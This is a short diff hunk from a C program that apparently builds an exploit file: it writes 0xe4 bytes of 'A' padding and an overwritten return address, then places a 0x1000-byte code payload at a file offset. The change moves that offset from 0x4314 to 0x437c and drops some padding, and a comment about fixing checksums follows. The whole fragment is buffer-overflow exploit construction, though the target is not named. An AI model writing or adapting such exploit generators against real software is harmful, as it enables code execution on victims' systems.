@@ -51,8 +51,7 @@ int main(int argc, char** argv)
         char padding = 'A';
         for (int i = 0; i < 0xe4; ++i) fwrite(&padding, 1, 1, fp);
         fwrite(ret_addr, 4, 1, fp);
-        fseek(fp, 0x4314, SEEK_SET);
-        for (int i = 0; i < 0x68; ++i) fwrite(&padding, 1, 1, fp);
+        fseek(fp, 0x437c, SEEK_SET);
         fwrite(code, 0x1000, 1, fp);
 
         //Fixing checksums:
